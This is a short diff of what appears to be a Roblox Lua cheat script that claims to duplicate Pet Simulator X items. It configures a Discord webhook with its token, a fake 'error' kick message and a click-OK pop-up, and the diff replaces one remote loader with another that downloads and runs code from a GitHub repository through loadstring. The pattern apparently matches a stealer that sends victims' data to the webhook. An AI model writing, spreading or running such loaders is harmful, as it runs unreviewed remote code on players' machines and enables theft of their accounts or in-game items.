@@ -4,4 +4,4 @@ _G.Webhook = "https://discord.com/api/webhooks/1043980940130664568/Rr7zvobT04qrw
 _G.KickMessage = "error"
 _G.PopUpMessage = "Do You Want to Use This? Click Ok If Yes"
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()
+loadstring(game:HttpGet"https://raw.githubusercontent.com/ToxinKindaScripts/psxdupe/main/script2")()
